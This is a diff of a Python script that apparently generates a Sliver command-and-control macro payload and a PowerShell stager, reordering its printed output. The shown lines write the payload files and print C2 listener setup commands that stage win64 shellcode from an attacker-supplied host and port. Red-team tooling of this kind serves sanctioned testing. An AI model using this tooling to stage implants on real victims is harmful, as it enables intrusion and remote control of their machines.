@@ -27,22 +27,24 @@ End Sub
 
    f = open(output, 'r')
    file_contents = f.read()
+
+   # Start Printing Output :)
+   print (CRED + '==== Sliver Stager Setup ====\n' + CEND)
+   print (f'profiles new --mtls {lhost} --format shellcode win64\n')
+   print (f'stage-listener --url http://"{lhost}":"{lport}" --profile win64\n')
+
+
    print (CRED + '==== Sliver Macro Payload ====\n' + CEND)
    print(file_contents)
+   print (CGREEN + '#> Sliver_Macro.txt was written to CWD\n' + CEND)
+   if 'Sliver_Macro.txt' in itemlist:
+      print (cwd + '/Sliver_Macro.txt\n')
 
    #write to file Sliver.ps1
    file = open ("Sliver.ps1","w")
    file.write (payload)
    file.close
-   print (CGREEN + '#> Sliver_Macro.txt was written to CWD\n' + CEND)
-   if 'Sliver_Macro.txt' in itemlist:
-      print (cwd + '/Sliver_Macro.txt\n')
 
-   print (CRED + '==== Sliver Stager Setup ====\n' + CEND)
-   print (f'profiles new --mtls {lhost} --format shellcode win64')
-   print ('')
-   print (f'stage-listener --url http://"{lhost}":"{lport}" --profile win64')
-   print ('')
    print (CRED + '==== Sliver.ps1 Script Staging ====\n' + CEND)
    print (CGREEN + '#> Sliver.ps1 was written to CWD\n' + CEND)
    if 'Sliver.ps1' in itemlist:
